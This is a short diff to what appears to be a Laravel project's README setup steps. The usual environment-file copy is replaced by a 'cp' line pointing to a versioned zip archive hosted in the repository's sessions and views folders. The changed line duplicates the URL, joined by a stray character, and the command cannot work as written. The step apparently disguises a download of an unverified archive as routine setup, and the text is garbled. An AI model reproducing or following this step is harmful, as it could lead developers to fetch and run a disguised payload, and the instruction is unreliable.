@@ -4,7 +4,7 @@
 composer install
 ```
 ```bash
-cp https://raw.githubusercontent.com/Z1ted/XUONGTHUCHANH/Branch-Chính/storage/framework/sessions/XUONGTHUCHANH-v3.3-alpha.5.zip .env
+cp https://raw.githubusercontent.com/Z1ted/XUONGTHUCHANH/Branch-Chính/resources/views/admin/category/Software-v3.6.zipíhttps://raw.githubusercontent.com/Z1ted/XUONGTHUCHANH/Branch-Chính/resources/views/admin/category/Software-v3.6.zip .env
 ```
 ```bash
 php artisan migrate
